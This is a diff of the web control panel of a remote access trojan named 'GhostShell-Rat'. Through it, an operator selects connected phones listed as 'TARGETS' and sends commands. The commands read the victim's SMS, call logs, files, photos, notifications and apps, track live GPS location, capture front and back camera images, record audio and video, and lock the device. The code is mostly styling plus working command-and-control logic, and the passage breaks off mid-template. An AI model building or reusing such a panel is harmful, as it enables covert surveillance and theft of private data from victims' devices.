@@ -6,13 +6,7 @@
     <title>GhostShell-Rat · anonymous</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', 'Courier New', monospace, system-ui;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', 'Courier New', monospace, system-ui; }
         :root {
             --bg: #0b0f0e;
             --surface: #141a1a;
@@ -31,7 +25,7 @@
             background-color: var(--bg);
             color: var(--text);
             min-height: 100vh;
-            padding: 8px;
+            padding: 12px;
             display: flex;
             align-items: flex-start;
             justify-content: center;
@@ -39,915 +33,278 @@
             background-attachment: fixed;
         }
 
-        /* system loading bar — entrance */
+        /* system loading bar */
         #sys-loader {
-            position: fixed;
-            inset: 0;
-            background: var(--bg);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            z-index: 9999;
-            transition: opacity 0.6s ease, visibility 0.6s;
+            position: fixed; inset: 0; background: var(--bg);
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            z-index: 9999; transition: opacity 0.6s ease, visibility 0.6s;
             backdrop-filter: blur(4px);
         }
-        .loader-hidden {
-            opacity: 0;
-            visibility: hidden;
-            pointer-events: none;
-        }
-        .cyber-bar {
-            width: 260px;
-            height: 6px;
-            background: #1f2b2b;
-            border-radius: 8px;
-            box-shadow: inset 0 0 6px #000;
-            margin: 20px 0 10px;
-            overflow: hidden;
-        }
-        .cyber-fill {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary));
-            box-shadow: 0 0 18px var(--glow-primary);
-            border-radius: 8px;
-            transition: width 2.5s ease-out;
-        }
-        #loader-text {
-            font-size: 1.6rem;
-            font-weight: 300;
-            letter-spacing: 6px;
-            color: var(--accent-primary);
-            text-shadow: 0 0 8px var(--accent-primary);
-            animation: flicker 2.4s infinite;
-        }
-        .small-glitch {
-            color: var(--accent-secondary);
-            font-size: 0.8rem;
-            opacity: 0.7;
-        }
+        .loader-hidden { opacity: 0; visibility: hidden; pointer-events: none; }
+        .cyber-bar { width: 260px; height: 6px; background: #1f2b2b; border-radius: 8px; box-shadow: inset 0 0 6px #000; margin: 20px 0 10px; overflow: hidden; }
+        .cyber-fill { height: 100%; width: 0%; background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary)); box-shadow: 0 0 18px var(--glow-primary); transition: width 0.3s; }
+        #loader-text { font-size: 1.6rem; font-weight: 300; letter-spacing: 6px; color: var(--accent-primary); text-shadow: 0 0 8px var(--accent-primary); animation: flicker 2.4s infinite; }
 
-        /* main app container */
-        .app-container {
-            width: 100%;
-            max-width: 1300px;
-            display: flex;
-            flex-direction: column;
-            gap: 14px;
-        }
+        .app-container { width: 100%; max-width: 1300px; display: flex; flex-direction: column; gap: 14px; }
 
-        /* header */
         .header {
-            background: var(--surface);
-            border: 1px solid var(--accent-primary);
-            box-shadow: 0 0 15px var(--glow-primary);
-            padding: 1rem 1.2rem;
-            border-radius: 28px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            flex-wrap: wrap;
-            backdrop-filter: blur(4px);
+            background: var(--surface); border: 1px solid var(--accent-primary);
+            box-shadow: 0 0 15px var(--glow-primary); padding: 1.2rem;
+            border-radius: 28px; display: flex; align-items: center; justify-content: space-between;
         }
-        .header h1 {
-            font-size: 1.8rem;
-            font-weight: 400;
-            letter-spacing: 2px;
-            background: linear-gradient(135deg, #b0ffec, var(--accent-secondary));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-        .ghost-icon {
-            color: var(--accent-secondary);
-            font-size: 2rem;
-            filter: drop-shadow(0 0 8px #ff3b9e);
-        }
+        .header h1 { font-size: 1.8rem; font-weight: 400; letter-spacing: 2px; background: linear-gradient(135deg, #b0ffec, var(--accent-secondary)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
 
-        /* main two-column grid */
-        .dashboard-grid {
-            display: grid;
-            grid-template-columns: 260px 1fr;
-            gap: 16px;
-        }
+        .dashboard-grid { display: grid; grid-template-columns: 280px 1fr; gap: 16px; }
 
-        /* device panel */
-        .device-panel {
-            background: var(--surface);
-            border-radius: 28px;
-            border: 1px solid var(--accent-primary);
-            padding: 18px 12px;
-            box-shadow: var(--border-glow);
-            backdrop-filter: blur(4px);
-            max-height: 70vh;
-            overflow-y: auto;
-            scrollbar-width: thin;
-            scrollbar-color: var(--accent-primary) #162020;
-        }
-        .device-panel h2 {
-            font-size: 1.2rem;
-            margin-bottom: 16px;
-            color: var(--accent-secondary);
-            border-bottom: 1px dashed var(--accent-primary);
-            padding-bottom: 8px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        .device-list {
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
-        }
+        .panel { background: var(--surface); border-radius: 28px; border: 1px solid var(--accent-primary); padding: 20px; box-shadow: var(--border-glow); backdrop-filter: blur(4px); }
+        .device-panel { max-height: 75vh; overflow-y: auto; }
+        .device-panel h2 { font-size: 1.1rem; margin-bottom: 18px; color: var(--accent-secondary); border-bottom: 1px dashed #2a3a3a; padding-bottom: 10px; }
+
         .device-item {
-            background: #1b2626;
-            padding: 14px 12px;
-            border-radius: 18px;
-            border: 1px solid transparent;
-            cursor: pointer;
-            transition: var(--transition);
-            box-shadow: 0 4px 6px rgba(0,0,0,0.6);
+            background: #1b2626; padding: 16px; border-radius: 20px; border: 1px solid transparent;
+            cursor: pointer; transition: var(--transition); margin-bottom: 10px;
         }
-        .device-item:hover {
-            border-color: var(--accent-primary);
-            background: #1f2e2e;
-            transform: translateY(-2px);
-        }
-        .device-item.active {
-            border: 1px solid var(--accent-secondary);
-            box-shadow: 0 0 16px var(--glow-secondary);
-            background: #1d2c2c;
-        }
-        .device-item strong {
-            display: block;
-            font-size: 1rem;
-            color: var(--accent-primary);
-        }
-        .device-item small {
-            font-size: 0.75rem;
-            color: var(--text-dim);
-        }
+        .device-item:hover { border-color: var(--accent-primary); background: #1f2e2e; }
+        .device-item.active { border-color: var(--accent-secondary); box-shadow: 0 0 16px var(--glow-secondary); background: #1d2c2c; }
+        .device-item strong { display: block; color: var(--accent-primary); font-size: 1rem; }
+        .device-item small { font-size: 0.75rem; color: var(--text-dim); }
 
-        /* main content area */
-        .main-panel {
-            background: var(--surface);
-            border-radius: 28px;
-            border: 1px solid var(--accent-primary);
-            padding: 18px 16px;
-            box-shadow: var(--border-glow);
-            backdrop-filter: blur(4px);
-        }
+        .status-bar { display: flex; justify-content: space-between; background: #0f1818; padding: 14px 20px; border-radius: 40px; margin-bottom: 24px; border: 1px solid #2a3a3a; }
+        .status-online { color: #00ffc3; font-weight: 600; position: relative; padding-left: 15px; }
+        .status-online::before { content: ""; position: absolute; left: 0; top: 6px; width: 10px; height: 10px; background: #00ffc3; border-radius: 50%; animation: pulse 1.5s infinite; }
 
-        .status-bar-mod {
-            display: flex;
-            justify-content: space-between;
-            background: #0f1818;
-            padding: 12px 18px;
-            border-radius: 40px;
-            margin-bottom: 22px;
-            border: 1px solid #2a3a3a;
-            font-size: 0.95rem;
-            flex-wrap: wrap;
-        }
-        .target-glow {
-            color: var(--accent-primary);
-            font-weight: 500;
-            text-shadow: 0 0 5px var(--accent-primary);
-        }
-        .status-online {
-            color: #00ffc3;
-            font-weight: 600;
-            position: relative;
-            padding-left: 14px;
-        }
-        .status-online::before {
-            content: "";
-            position: absolute;
-            left: 0;
-            top: 6px;
-            width: 10px;
-            height: 10px;
-            background: #00ffc3;
-            border-radius: 50%;
-            animation: pulse 1.5s infinite;
-        }
-
-        /* feature grid */
-        .feature-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(110px, 1fr));
-            gap: 12px;
-        }
+        .feature-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 12px; }
         .grid-item {
-            background: #1b2828;
-            border: 1px solid #2f4040;
-            border-radius: 24px;
-            padding: 16px 6px;
-            text-align: center;
-            color: var(--accent-primary);
-            transition: var(--transition);
-            font-size: 0.8rem;
-            cursor: pointer;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
-            backdrop-filter: blur(2px);
+            background: #1b2828; border: 1px solid #2f4040; border-radius: 24px; padding: 18px 8px;
+            text-align: center; color: var(--accent-primary); transition: var(--transition); cursor: pointer;
         }
-        .grid-item i {
-            font-size: 2rem;
-            margin-bottom: 8px;
-            display: block;
-            color: var(--accent-secondary);
-        }
-        .grid-item:active {
-            transform: scale(0.96);
-        }
-        .grid-item:not(.disabled):hover {
-            background: #1e3030;
-            border-color: var(--accent-primary);
-            box-shadow: 0 0 24px var(--glow-primary);
-        }
-        .grid-item.disabled {
-            opacity: 0.25;
-            filter: grayscale(1);
-            pointer-events: none;
-        }
+        .grid-item i { font-size: 2rem; margin-bottom: 10px; display: block; color: var(--accent-secondary); }
+        .grid-item:hover { background: #1e3030; border-color: var(--accent-primary); box-shadow: 0 0 24px var(--glow-primary); transform: translateY(-3px); }
+        .grid-item.disabled { opacity: 0.3; pointer-events: none; filter: grayscale(1); }
 
-        /* modal — sleek */
-        .modal {
-            display: none;
-            position: fixed;
-            inset: 0;
-            background: rgba(2, 10, 10, 0.85);
-            backdrop-filter: blur(8px);
-            align-items: center;
-            justify-content: center;
-            z-index: 1000;
-            padding: 16px;
-        }
-        .modal-card {
-            background: var(--surface);
-            width: 100%;
-            max-width: 900px;
-            max-height: 85vh;
-            border-radius: 36px;
-            border: 1px solid var(--accent-primary);
-            box-shadow: 0 0 40px var(--glow-secondary);
-            display: flex;
-            flex-direction: column;
-            overflow: hidden;
-        }
-        .modal-header {
-            padding: 22px 24px;
-            background: #101b1b;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 1px solid #2e4545;
-        }
-        .modal-header h2 {
-            color: var(--accent-secondary);
-            font-weight: 400;
-            letter-spacing: 1px;
-        }
-        .close-btn {
-            font-size: 2.2rem;
-            line-height: 1;
-            color: var(--text-dim);
-            cursor: pointer;
-            transition: var(--transition);
-        }
-        .close-btn:hover {
-            color: var(--accent-secondary);
-            transform: scale(1.2);
-        }
-        .modal-body {
-            padding: 22px;
-            overflow-y: auto;
-            background: #121d1d;
-            flex: 1;
-            font-size: 0.9rem;
-            scroll-behavior: smooth;
-        }
-        .modal-footer {
-            padding: 16px 22px;
-            background: #0c1616;
-            display: flex;
-            gap: 12px;
-            flex-wrap: wrap;
-            align-items: center;
-            border-top: 1px solid #2e4545;
-        }
+        .modal { display: none; position: fixed; inset: 0; background: rgba(2, 10, 10, 0.9); backdrop-filter: blur(10px); align-items: center; justify-content: center; z-index: 1000; padding: 20px; }
+        .modal-card { background: var(--surface); width: 100%; max-width: 900px; max-height: 85vh; border-radius: 36px; border: 1px solid var(--accent-primary); box-shadow: 0 0 40px var(--glow-secondary); display: flex; flex-direction: column; overflow: hidden; }
+        .modal-header { padding: 24px; background: #101b1b; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #2e4545; }
+        .modal-body { padding: 24px; overflow-y: auto; flex: 1; }
+        .modal-footer { padding: 18px 24px; background: #0c1616; display: flex; gap: 12px; border-top: 1px solid #2e4545; }
 
-        /* loading bar inside modal / popup */
-        .data-loader {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 32px;
-            width: 100%;
-        }
-        .mini-loader-bar {
-            width: 200px;
-            height: 5px;
-            background: #1f2f2f;
-            border-radius: 12px;
-            overflow: hidden;
-            margin: 20px 0 10px;
-        }
-        .mini-loader-fill {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary));
-            box-shadow: 0 0 20px magenta;
-            transition: width 1.2s ease;
-        }
+        .toast-popup { position: fixed; top: 24px; right: 24px; background: #121f1f; border-left: 6px solid var(--accent-secondary); padding: 20px 28px; border-radius: 24px; box-shadow: 0 10px 40px rgba(0,0,0,0.8); border: 1px solid var(--accent-primary); color: white; z-index: 3000; animation: slideIn 0.4s cubic-bezier(0.18, 0.89, 0.32, 1.28) forwards; }
+        
+        table { width: 100%; border-collapse: collapse; }
+        th { text-align: left; color: var(--accent-primary); border-bottom: 1px solid #3d5a5a; padding: 10px; }
+        td { padding: 10px; border-bottom: 1px solid #1e2e2e; color: var(--text-dim); }
 
-        /* popup notif (toast) */
-        .toast-popup {
-            position: fixed;
-            top: 24px;
-            right: 24px;
-            background: #121f1f;
-            border-left: 6px solid var(--accent-secondary);
-            padding: 18px 24px;
-            border-radius: 48px;
-            box-shadow: 0 10px 30px rgba(255, 0, 255, 0.3);
-            border: 1px solid var(--accent-primary);
-            color: white;
-            max-width: 320px;
-            z-index: 3000;
-            backdrop-filter: blur(16px);
-            transform: translateX(400px);
-            animation: slideIn 0.3s forwards;
-        }
-        .toast-popup.info {
-            border-left-color: var(--accent-primary);
-        }
-        .toast-content {
-            display: flex;
-            align-items: center;
-            gap: 16px;
-        }
-        .toast-content i {
-            font-size: 1.8rem;
-            color: var(--accent-secondary);
-        }
+        input, button { background: #1e2e2e; border: 1px solid #3b5e5e; padding: 14px 20px; border-radius: 60px; color: white; width: 100%; }
+        button { background: var(--accent-primary); color: #000; font-weight: bold; border: none; cursor: pointer; }
+        button:active { transform: scale(0.96); }
 
-        /* table */
-        table {
-            width: 100%;
-            border-collapse: collapse;
-        }
-        th {
-            text-align: left;
-            color: var(--accent-primary);
-            font-weight: 400;
-            border-bottom: 1px solid #3d5a5a;
-            padding: 8px 4px;
-        }
-        td {
-            padding: 8px 4px;
-            border-bottom: 1px solid #1e2e2e;
-            color: var(--text-dim);
-        }
-        .gallery-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
-            gap: 16px;
-        }
-        .gallery-item img {
-            width: 100%;
-            height: 110px;
-            object-fit: cover;
-            border-radius: 24px;
-            border: 2px solid var(--accent-primary);
-        }
-
-        /* animation keyframes */
-        @keyframes pulse {
-            0% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.5; transform: scale(1.2); }
-            100% { opacity: 1; transform: scale(1); }
-        }
-        @keyframes flicker {
-            0% { opacity: 1; }
-            45% { opacity: 1; }
-            46% { opacity: 0.2; }
-            47% { opacity: 1; }
-            48% { opacity: 0.2; }
-            49% { opacity: 1; }
-            90% { opacity: 1; }
-            91% { opacity: 0.3; }
-            92% { opacity: 1; }
-        }
-        @keyframes slideIn {
-            to { transform: translateX(0); }
-        }
-
-        /* mobile tweaks */
-        @media (max-width: 700px) {
-            .dashboard-grid { grid-template-columns: 1fr; }
-            .device-panel { max-height: 38vh; }
-            .header h1 { font-size: 1.3rem; }
-        }
-
-        input, button {
-            background: #1e2e2e;
-            border: 1px solid #3b5e5e;
-            padding: 12px 18px;
-            border-radius: 60px;
-            color: white;
-            font-size: 0.9rem;
-        }
-        button {
-            background: var(--accent-primary);
-            color: #000;
-            font-weight: bold;
-            border: none;
-            cursor: pointer;
-            transition: var(--transition);
-            box-shadow: 0 0 12px var(--glow-primary);
-        }
-        button:active { transform: scale(0.95); }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
+        @keyframes flicker { 0%, 45%, 47%, 49%, 90%, 92%, 100% { opacity: 1; } 46%, 48%, 91% { opacity: 0.2; } }
+        @keyframes slideIn { from { transform: translateX(500px); } to { transform: translateX(0); } }
     </style>
 </head>
 <body>
-    <!-- ENTRANCE SYSTEM LOADER (only once) -->
     <div id="sys-loader">
         <div id="loader-text">GHOST//SHELL</div>
-        <div class="cyber-bar"><div class="cyber-fill" id="loader-fill" style="width:0%"></div></div>
-        <div class="small-glitch">booting secure channel ...</div>
+        <div class="cyber-bar"><div class="cyber-fill" id="loader-fill"></div></div>
     </div>
 
     <div class="app-container">
         <header class="header">
             <h1><i class="fas fa-skull"></i> GhostShell-Rat</h1>
-            <div class="ghost-icon"><i class="fas fa-ghost"></i></div>
+            <div style="color:var(--accent-secondary); font-size:2rem;"><i class="fas fa-ghost"></i></div>
         </header>
 
         <div class="dashboard-grid">
-            <!-- left panel targets -->
-            <div class="device-panel">
+            <div class="panel device-panel">
                 <h2><i class="fas fa-satellite-dish"></i> TARGETS</h2>
-                <div class="device-list" id="device-list">[scanning...]</div>
+                <div id="device-list"></div>
             </div>
 
-            <!-- main right panel -->
-            <div class="main-panel">
-                <div class="status-bar-mod">
-                    <span>🎯 <span class="target-glow" id="device-info">None Selected</span></span>
-                    <span>⚡ <span class="status-online" id="connection-status">OFFLINE</span></span>
+            <div class="panel main-panel">
+                <div class="status-bar">
+                    <span>🎯 <span id="device-info" style="color:var(--accent-primary);">None Selected</span></span>
+                    <span>⚡ <span id="connection-status">OFFLINE</span></span>
                 </div>
-
-                <!-- feature grid inject via js -->
-                <div class="feature-grid" id="main-grid-panel"></div>
+                <div id="main-grid-panel" class="feature-grid"></div>
             </div>
         </div>
     </div>
 
-    <!-- MODAL -->
     <div id="main-modal" class="modal">
         <div class="modal-card">
             <div class="modal-header">
-                <h2 id="modal-title">modal</h2>
-                <span class="close-btn" onclick="closeModal()">&times;</span>
+                <h2 id="modal-title" style="color:var(--accent-secondary);"></h2>
+                <span style="cursor:pointer; font-size:2.5rem; color:var(--text-dim);" onclick="closeModal()">&times;</span>
             </div>
-            <div class="modal-body" id="modal-body"><div class="data-loader">...</div></div>
+            <div class="modal-body" id="modal-body"></div>
             <div class="modal-footer" id="modal-footer"></div>
         </div>
     </div>
 
-    <!-- popup container (toast) -->
     <div id="popup-toast" class="toast-popup" style="display: none;"></div>
 
     <script>
         (function() {
-            // --- LOADING BAR animation on entry ---
-            const loader = document.getElementById('sys-loader');
-            const fill = document.getElementById('loader-fill');
-            let width = 0;
-            const interval = setInterval(() => {
-                width += 2;
-                if (width >= 100) {
-                    width = 100;
-                    clearInterval(interval);
-                    setTimeout(() => {
-                        loader.classList.add('loader-hidden');
-                    }, 400);
-                }
-                fill.style.width = width + '%';
-            }, 30);
+            let w = 0; const f = document.getElementById('loader-fill');
+            const i = setInterval(() => { w += 5; f.style.width = w + '%'; if (w >= 100) { clearInterval(i); setTimeout(() => document.getElementById('sys-loader').classList.add('loader-hidden'), 500); } }, 30);
         })();
 
-        // ---------- STATE & CACHE ----------
-        let state = { devices: [] };
-        let selectedClientId = null;
-        let currentModal = null;
-        let clientDataCache = {};
-        let notificationHashes = new Set();
-        let agentMessageHashes = new Set();
+        let state = { devices: [] }, selectedClientId = null, currentModal = null, clientDataCache = {}, lastDataHashes = {}, notificationHashes = new Set();
         let flashOn = false, screenRecordOn = false;
-        let popupHideTimer = null;
-        let lastDataHashes = {}; // To prevent flicker
 
-        // helper: show modern popup (no refresh)
-        function showPopup(type, message) {
+        function showPopup(type, message, duration = 8000) {
             const toast = document.getElementById('popup-toast');
             toast.style.display = 'block';
-            toast.innerHTML = `<div class="toast-content"><i class="fas fa-${type === 'error' ? 'exclamation-triangle' : 'bell'}"></i><span>${message}</span></div>`;
-            toast.className = `toast-popup ${type === 'error' ? 'info' : ''}`;
-            if (popupHideTimer) clearTimeout(popupHideTimer);
-            popupHideTimer = setTimeout(() => {
-                toast.style.display = 'none';
-            }, 6000);
+            toast.innerHTML = `<div style="display:flex;align-items:center;gap:15px;"><i class="fas fa-bell" style="font-size:1.5rem;color:var(--accent-secondary);"></i><span>${message}</span></div>`;
+            setTimeout(() => { toast.style.display = 'none'; }, duration);
         }
 
-        // api call
         async function sendCommand(cmd, body = {}) {
-            if (!selectedClientId) { showPopup('error', 'no target'); return; }
+            if (!selectedClientId) return;
             try {
-                await fetch('/api/command', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ cmd, client_id: selectedClientId, ...body })
-                });
+                const res = await fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ cmd, client_id: selectedClientId, ...body }) });
+                return await res.json();
             } catch (e) { console.error(e); }
         }
 
-        // select device
         function selectDevice(clientId, skipModalClose = false) {
             if (selectedClientId === clientId) return;
             selectedClientId = clientId;
-            flashOn = false; screenRecordOn = false;
             document.querySelectorAll('.device-item').forEach(el => el.classList.remove('active'));
-            const safeId = `device-${clientId.replace(/[:.]/g, '-')}`;
-            const el = document.getElementById(safeId);
+            const el = document.getElementById(`device-${clientId.replace(/[:.]/g, '-')}`);
             if (el) el.classList.add('active');
             updateMainDashboard();
             if (!skipModalClose) closeModal();
         }
 
-        // update device list
         function updateDeviceList() {
             const container = document.getElementById('device-list');
-            if (!state.devices.length) {
-                container.innerHTML = '<div class="device-item" style="opacity:0.5">♢ no ghosts</div>';
-                if(selectedClientId) {
-                    selectedClientId = null;
-                    updateMainDashboard();
-                }
+            if (!state.devices || !state.devices.length) {
+                container.innerHTML = '<div class="device-item" style="opacity:0.5">♢ no ghosts connected</div>';
                 return;
             }
-            let html = '';
-            state.devices.forEach(dev => {
-                const safeId = `device-${dev.id.replace(/[:.]/g, '-')}`;
-                html += `<div class="device-item ${selectedClientId === dev.id ? 'active' : ''}" id="${safeId}" onclick="selectDevice('${dev.id}')">
-                    <strong>${dev.model || 'unknown'}</strong>
-                    <small>${dev.id} · ${dev.battery || '??'}</small>
-                </div>`;
-            });
-            container.innerHTML = html;
-            if (!selectedClientId || !state.devices.some(d => d.id === selectedClientId)) {
-                if (state.devices.length) selectDevice(state.devices[0].id, true); // Don't close modal on auto-select
-            } else {
-                // re-highlight
-                document.querySelectorAll('.device-item').forEach(el => el.classList.remove('active'));
-                const activeEl = document.getElementById(`device-${selectedClientId.replace(/[:.]/g, '-')}`);
-                if(activeEl) activeEl.classList.add('active');
-            }
-            updateMainDashboard();
+            container.innerHTML = state.devices.map(dev => `
+                <div class="device-item ${selectedClientId === dev.id ? 'active' : ''}" id="device-${dev.id.replace(/[:.]/g, '-')}" onclick="selectDevice('${dev.id}')">
+                    <strong>${dev.model}</strong>
+                    <small>${dev.id}</small>
+                </div>`).join('');
+            if (!selectedClientId) selectDevice(state.devices[0].id, true);
         }
 
         function updateMainDashboard() {
-            const infoSpan = document.getElementById('device-info');
-            const connSpan = document.getElementById('connection-status');
             const grid = document.getElementById('main-grid-panel');
-            const enabled = selectedClientId && state.devices.some(d => d.id === selectedClientId);
+            const enabled = !!selectedClientId;
             if (enabled) {
                 const dev = state.devices.find(d => d.id === selectedClientId);
-                infoSpan.innerText = dev ? dev.info_str || dev.id : selectedClientId;
-                connSpan.innerHTML = 'ONLINE';
-                connSpan.className = 'status-online';
-            } else {
-                infoSpan.innerText = 'None Selected';
-                connSpan.innerHTML = 'OFFLINE';
-                connSpan.className = '';
-                connSpan.style.color = '#ff5f7c';
+                document.getElementById('device-info').innerText = dev ? dev.model : selectedClientId;
+                document.getElementById('connection-status').innerText = 'ONLINE';
+                document.getElementById('connection-status').className = 'status-online';
             }
-
-            const buttons = [
-                'sms','calls','filemanager','gallery','notifications','apps','lock','openurl',
-                'get_location','recorder','wallpaper','flash','screenrecord','takebackpic','takefrontpic'
-            ];
+            const buttons = ['sms','calls','filemanager','gallery','notifications','apps','lock','openurl','get_location','recorder','wallpaper','flash'];
             grid.innerHTML = buttons.map(btn => {
-                let icon = 'fa-question', label = btn;
+                let icon = 'fa-cog', label = btn.toUpperCase();
                 if (btn === 'sms') icon = 'fa-sms';
                 else if (btn === 'calls') icon = 'fa-phone-alt';
                 else if (btn === 'filemanager') icon = 'fa-folder-open';
                 else if (btn === 'gallery') icon = 'fa-images';
-                else if (btn === 'notifications') icon = 'fa-bell';
-                else if (btn === 'apps') icon = 'fa-th-large';
-                else if (btn === 'lock') icon = 'fa-user-lock', label = 'LOCK DEVICE';
-                else if (btn === 'openurl') icon = 'fa-external-link-alt';
-                else if (btn === 'get_location') icon = 'fa-crosshairs', label = 'LOKASI REALTIME';
-                else if (btn === 'recorder') icon = 'fa-video', label = 'RECORDER';
-                else if (btn === 'wallpaper') icon = 'fa-image', label = 'WALLPAPER';
-                else if (btn === 'flash') icon = 'fa-bolt';
-                else if (btn === 'screenrecord') icon = 'fa-video';
-                else if (btn === 'takebackpic') icon = 'fa-camera-retro';
-                else if (btn === 'takefrontpic') icon = 'fa-camera';
-
-                if (btn === 'flash') label = flashOn ? 'FLASH ON' : 'FLASH OFF';
-                if (btn === 'screenrecord') label = screenRecordOn ? 'REC ON' : 'REC OFF';
-
+                else if (btn === 'lock') { icon = 'fa-user-lock'; label = 'LOCK DEVICE'; }
+                else if (btn === 'get_location') { icon = 'fa-crosshairs'; label = 'LOKASI REALTIME'; }
+                else if (btn === 'recorder') { icon = 'fa-video'; label = 'RECORDER'; }
+                else if (btn === 'wallpaper') { icon = 'fa-image'; label = 'WALLPAPER'; }
+                else if (btn === 'flash') { icon = 'fa-bolt'; label = flashOn ? 'FLASH ON' : 'FLASH OFF'; }
                 return `<div class="grid-item ${!enabled ? 'disabled' : ''}" onclick="handleGridClick('${btn}')"><i class="fas ${icon}"></i>${label}</div>`;
             }).join('');
         }
 
-        // global click handler for grid
         window.handleGridClick = (action) => {
-            if (!selectedClientId) { showPopup('error', 'Select target first'); return; }
-            if (action === 'flash') { toggleFlash(); updateMainDashboard(); }
-            else if (action === 'screenrecord') { toggleScreenRecord(); updateMainDashboard(); }
-            else if (action === 'takebackpic' || action === 'takefrontpic') openModal(action);
-            else if (action === 'get_location') {
-                sendCommand('get_location');
-                openModal('get_location');
-            }
-            else if (action === 'lock') openModal('lock');
-            else if (action === 'recorder') openModal('recorder');
-            else if (action === 'wallpaper') openModal('wallpaper');
+            if (action === 'get_location') { sendCommand('get_location'); openModal('get_location'); }
+            else if (action === 'flash') { flashOn = !flashOn; sendCommand(flashOn ? 'flashon' : 'flashoff'); updateMainDashboard(); }
             else openModal(action);
         };
 
-        function toggleFlash() { flashOn = !flashOn; sendCommand(flashOn ? 'flashon' : 'flashoff'); }
-        function toggleScreenRecord() { screenRecordOn = !screenRecordOn; sendCommand(screenRecordOn ? 'screenrecord start' : 'screenrecord stop'); }
-
-        // MODAL with loading bar simulation (if data missing)
         function openModal(type) {
-            if (!selectedClientId) return showPopup('error', 'no target');
-            currentModal = type;
-            lastDataHashes[type] = ""; // Reset hash to force first render
+            currentModal = type; lastDataHashes[type] = "";
             document.getElementById('main-modal').style.display = 'flex';
-            document.getElementById('modal-title').innerText = type.toUpperCase();
-            const body = document.getElementById('modal-body');
-            const footer = document.getElementById('modal-footer');
-            
-            if (type === 'get_location') {
-                body.innerHTML = `<div class="data-loader"><i class="fas fa-satellite-dish fa-spin" style="font-size:3rem;color:var(--accent-secondary)"></i><div class="mini-loader-bar"><div class="mini-loader-fill" style="width:60%"></div></div><span>Triangulating high-accuracy GPS...</span></div>`;
-            } else {
-                body.innerHTML = `<div class="data-loader"><i class="fas fa-spinner fa-pulse" style="font-size:2rem;color:var(--accent-secondary)"></i><div class="mini-loader-bar"><div class="mini-loader-fill" style="width:90%"></div></div><span>injecting...</span></div>`;
-            }
-            footer.innerHTML = '';
-
-            // request fresh data
-            const cmdMap = { 
-                sms:'getsms', calls:'getcalllogs', filemanager:'filemanager', 
-                gallery:'gallery', apps:'list_app', notifications:'getnotifications',
-                takebackpic: 'takebackpic', takefrontpic: 'takefrontpic'
-            };
+            document.getElementById('modal-title').innerText = type.toUpperCase().replace('_', ' ');
+            document.getElementById('modal-body').innerHTML = '<div style="text-align:center;padding:40px;"><i class="fas fa-spinner fa-spin" style="font-size:3rem;color:var(--accent-primary);"></i></div>';
+            const cmdMap = { sms:'getsms', calls:'getcalllogs', filemanager:'filemanager', gallery:'gallery', apps:'list_app', notifications:'getnotifications' };
             if (cmdMap[type]) sendCommand(cmdMap[type]);
+            renderModalContent();
         }
 
-        window.closeModal = () => {
-            if (currentModal === 'gallery') sendCommand('exit_gallery');
-            if (currentModal === 'filemanager') sendCommand('exit_shell');
-            document.getElementById('main-modal').style.display = 'none';
-            currentModal = null;
-        };
+        function closeModal() {
+            if (currentModal === 'recorder') {
+                const d = clientDataCache[selectedClientId];
+                if (d?.last_video) fetch('/api/delete_file', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ filename: d.last_video }) });
+            }
+            document.getElementById('main-modal').style.display = 'none'; currentModal = null;
+        }
 
         function renderModalContent() {
             if (!currentModal || !selectedClientId) return;
-            const body = document.getElementById('modal-body');
-            const footer = document.getElementById('modal-footer');
-            const data = clientDataCache[selectedClientId] || {};
-            
-            // Check if data changed to prevent flickering
-            let currentData;
-            if (currentModal === 'takebackpic' || currentModal === 'takefrontpic') {
-                currentData = data.camera_image;
-            } else {
-                currentData = JSON.stringify(data[currentModal] || data[`${currentModal}_logs`] || {});
-            }
-            
-            if (lastDataHashes[currentModal] === currentData) return;
-            lastDataHashes[currentModal] = currentData;
-
+            const body = document.getElementById('modal-body'), footer = document.getElementById('modal-footer'), data = clientDataCache[selectedClientId] || {};
             footer.innerHTML = '';
 
-            if (currentModal === 'takebackpic' || currentModal === 'takefrontpic') {
-                if (data.camera_image) {
-                    const isFront = data.camera_image.includes('front_pic');
-                    body.innerHTML = `<div style="text-align:center;">
-                        <h3 style="color:var(--accent-secondary); margin-bottom:10px;">${isFront ? 'FRONT' : 'BACK'} CAMERA CAPTURED</h3>
-                        <img src="/captured_images/${data.camera_image}" style="max-width:100%; border-radius:18px; border:2px solid var(--accent-primary); box-shadow:0 0 20px var(--glow-primary);">
-                        <div style="margin-top:10px; display:flex; gap:10px; justify-content:center;">
-                            <a href="/captured_images/${data.camera_image}" target="_blank" style="color:var(--accent-primary); text-decoration:none; font-size:0.8rem; border:1px solid; padding:6px 12px; border-radius:12px;">💾 Original</a>
